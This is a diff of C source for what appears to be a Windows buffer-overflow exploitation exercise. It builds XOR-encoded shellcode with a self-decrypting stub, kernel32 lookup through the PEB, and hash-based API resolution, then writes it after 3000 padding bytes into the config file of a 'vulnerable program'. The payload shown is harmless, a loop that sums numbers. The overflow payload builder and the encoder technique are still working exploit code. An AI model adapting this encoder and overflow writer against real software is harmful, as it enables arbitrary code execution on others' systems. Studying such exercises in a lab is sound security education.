@@ -7,8 +7,14 @@
 
 #pragma region ShellCode
 
-#define XOR_BYTE 0x5
 #define XOR_VAL 0x01010101
+#define XOR_BYTE 0x2
+
+#define ACTIVE_CODE_SZ 85
+#define XOR_CODE_SZ 75
+
+// if we want to test our shell we won't need to encrypt it
+//#define debug_code
 
 
 PPEB get_peb(void);
@@ -20,58 +26,52 @@ FARPROC __stdcall find_function(HMODULE module, DWORD hash);
 void __stdcall shell_entry();
 void END_SHELLCODE(void);
 
-// if we want to test our shell we won't need to encrypt it
-//#define debug_code
-
 #pragma optimize("", off)  
 
 void __stdcall shell_code()
 {
-	char* begin, *end;
+	char* p, *begin, xr = XOR_BYTE;
+	int sz;
 
-#ifndef debug_code
-
-	// get shell_entry address
 	__asm
 	{
-		mov eax, shell_entry
-		xor eax, XOR_VAL
+		xor eax, eax
+		mov al, ACTIVE_CODE_SZ
+		mov sz, eax
+	}
+	
+	__asm
+	{
+		mov eax, ebp
+		add eax, XOR_CODE_SZ
+
+		// need this to add for decrypting code (gained by value matching in immunity debugger)
+		add eax, 4				
 		mov begin, eax
 	}
 
-	// get END_SHELLCODE address
-	__asm
-	{
-		mov eax, END_SHELLCODE
-		xor eax, XOR_VAL
-		mov end, eax
-	}
-
-	int active_code_size = (int)end - (int)begin;
-
 	//decrypt shell code
-	for (char* p = begin; p - begin < active_code_size; p++)
-		*p ^= XOR_BYTE;
+	for (p = begin; p - begin < sz; p++)
+		*p ^= xr;
 
-#else
-
-	shell_begin = (int)shell_entry;
-
-#endif // debug_code
-
-	// shell_entry
-	((void(*)())begin)();
+	shell_entry();
 }
 
 void __stdcall shell_entry()
 {
 	// work
-	HMODULE kern32 = find_kernel32();
-	char name[] = { 'E','x','i','t','P','r','o','c','e','s','s', 0 };
-	FARPROC exit = find_function(kern32, ror13_hash((char*)name));
-	
-	exit(0);
+	//HMODULE kern32 = find_kernel32();
+	//char name[] = { 'E','x','i','t','P','r','o','c','e','s','s', 0 };
+	//FARPROC exit = find_function(kern32, ror13_hash((char*)name));
+	int s = 0;
+	for (int i = 0; i < 100; i++)
+		s += i;
+
+	//exit(0);
 }
+
+void __declspec(naked) END_SHELLCODE(void) {}
+
 
 HMODULE __stdcall find_kernel32(void)
 {
@@ -172,8 +172,6 @@ FARPROC __stdcall find_function(HMODULE module, DWORD hash)
 	return NULL;
 }
 
-void __declspec(naked) END_SHELLCODE(void) {}
-
 #pragma optimize("", on)  
 #pragma endregion ShellCode
 
@@ -194,6 +192,30 @@ unsigned getFileSize(char* path)
 
 	if (n > 0)
 		return (unsigned)n;
+
+	return 0;
+}
+
+// find byte that won't be found in the byte code
+unsigned char find_xor_byte()
+{
+	for (int byte = 1; byte < 0xFF; byte++)
+	{
+		BOOL found = FALSE;
+
+		for (char* c = (char*)shell_code + XOR_CODE_SZ; c < (char*)END_SHELLCODE; c++)
+		{
+			if (*c == byte)
+			{
+				found = TRUE;
+				break;
+			}
+		}
+
+		// is not found -> can use xor
+		if (!found)
+			return (unsigned char)byte;
+	}
 
 	return 0;
 }
@@ -237,7 +259,7 @@ BOOL sc_write_conf(char *path, char* path_to)
 		return FALSE;
 	}
 
-	// write 3000 + 4 + 4 + 4 'H' bytes (append after /start)
+	// write 3000 + 4 + 4 + 4 'H' bytes (append after /start), 3000 - max buf size of vulnerable program
 	char tmp[3000 + sizeof(int) + sizeof(int) + sizeof(int)];
 	memset(tmp, 'H', sizeof(tmp));
 	if (!WriteFile(hfile, tmp, sizeof(tmp), (LPDWORD)&written, NULL)) {
@@ -266,47 +288,56 @@ BOOL sc_write_conf(char *path, char* path_to)
 BOOL sc_write_bin(char *path)
 {
 	int full_code_size = (int)END_SHELLCODE - (int)shell_code;
-	int active_code_size = (int)END_SHELLCODE - (int)shell_entry;
-	int xor_code_size = full_code_size - active_code_size;
+	int xor_code_size = 0, active_code_size = 0;
 
+	// copy future shell code to buffer
 	char* buf = (char*)malloc(full_code_size * sizeof(char));
 	memcpy(buf, shell_code, full_code_size);
 
-#ifndef debug_code
-
-	BOOL b1 = FALSE, b2 = FALSE;
-
-	// xor shell_entry address
-	for (char* p = buf; p - buf < xor_code_size; p++)
+	// find first ret -> end of shell_code
+	char* pf = (char*)shell_code;
+	while (*pf != (char)0xC3)
 	{
-		// addresses contain null bytes therefore need to use xor
-		if (!b1 && *(int*)p == (int)shell_entry)
-		{
-			*(int*)p ^= XOR_VAL;
-			b1 = TRUE;
-			printf("XORed shell_entry address\n");
-		}
+		//printf("pf = 0x%x\n", (char)*pf);
+		xor_code_size++;
+		pf++; 
+	}
+	
+	/*
+	encrypt start here:
 
-		if (!b2 && *(int*)p == (int)END_SHELLCODE)
-		{
-			*(int*)p ^= XOR_VAL;
-			b2 = TRUE;
-			printf("XORed END_SHELLCODE address\n");
-		}
+	004010CA E8 11 00 00 00       call        004010E0  
+	004010CF 8B E5                mov         esp,ebp  
+	004010D1 5D                   pop         ebp  
+	004010D2 C3                   ret  
 
-		if (b1 && b2)
-			break;
+	substract last bytes -> get xor_code_size
+
+	*/
+	xor_code_size -= 8;
+	active_code_size = full_code_size - xor_code_size;
+
+	if (xor_code_size != XOR_CODE_SZ || active_code_size != ACTIVE_CODE_SZ)
+	{
+		printf("Need to change constant XOR_CODE_SZ to %d\n", xor_code_size);
+		printf("Need to change constant ACTIVE_CODE_SZ to %d\n", active_code_size);
+		return FALSE;
 	}
 
-	printf("XORing shellcode\n");
+	unsigned char xr = find_xor_byte();
+	if (xr != XOR_BYTE)
+	{
+		if (xr == 0)
+			printf("Fatal: no suitable value for XOR_BYTE\n");
+		else
+			printf("Need to update XOR_BYTE constant to 0x%x\n", xr);
+		return FALSE;
+	}
 
-	// encrypt code n
+	// encrypt active code part
 	char* begin = (char*)(buf + xor_code_size);
 	for (char* p = begin; p - begin < active_code_size; p++)
 		*p ^= XOR_BYTE;
-
-#endif // DEBUG
-
 
 	// write shellcode
 	FILE *output_file = fopen(path, "wb");
@@ -349,79 +380,39 @@ void sc_exec(char* path)
 	free(code); 
 }
 
-// find byte that won't be found in the byte code
-unsigned char find_xor_byte()
-{
-	for (int byte = 1; byte < 0xFF; byte++)
-	{
-		BOOL found = FALSE;
-
-		for (char* c = (char*)shell_entry; (int)c < (int)END_SHELLCODE; c++)
-		{
-			if (*c == byte)
-			{
-				found = TRUE;
-				break;
-			}
-		}
-
-		// is not found -> can use xor
-		if (!found)
-			return (unsigned char)byte;
-	}
-
-	return 0;
-}
-
-
 int main(int argc, char *argv[])
 {
 	//shell_code();
 
-	unsigned char xor_byte = find_xor_byte();
-
-	if (xor_byte == 0)
-	{
-		printf("Xor byte is null\n");
-		return 1;
-	}
-
-	if (xor_byte != XOR_BYTE)
-	{
-		printf("Need to update XOR_BYTE constant to 0x%x\n", xor_byte);
-		return 1;
-	}
-
 	// clear config file
+	CopyFile("..\\Release\\"CONFIG_FILE_COPY, "..\\Release\\"CONFIG_FILE, FALSE);
 	CopyFile(CONFIG_FILE_COPY, CONFIG_FILE, FALSE);
 
+
 	// write shell code to bin file
-	if (!sc_write_bin(SHELLCODE_FILE))
+	if (!sc_write_bin(SHELLCODE_FILE) || !sc_write_bin("..\\Release\\"SHELLCODE_FILE))
 	{
-		printf("Unable to load shell. Exitting\n");
+		printf("Unable to write shell to binary file. Exitting\n");
+		getchar();
 		return 1;
 	}
 
 	// write shell code from bin to conf file
-	if (!sc_write_conf(SHELLCODE_FILE, CONFIG_FILE)) {
-
-		printf("Unable to load shell. Exitting\n");
+	if (!sc_write_conf(SHELLCODE_FILE, CONFIG_FILE) 
+		|| !sc_write_conf("..\\Release\\"SHELLCODE_FILE, "..\\Release\\"CONFIG_FILE))
+	{
+		printf("Unable to write shell to config file. Exitting\n");
+		getchar();
 		return 1;
 	}
 
-	printf("Enter any key to execute shell code\n");
-	getchar();
+	printf("Success. Enter any key to exit\n");
 
-	// load shell code to virtual memory and exec
-	sc_exec(SHELLCODE_FILE);
+	if (getchar())
+		return 0;
 
-	printf("Enter any key to exit\n");
-
-	if (getchar() && FALSE)
-	{
-		// for compilation and debugging
-		shell_code();
-	}
+	// for compilation
+	shell_code();
 
 	return 0;
 }
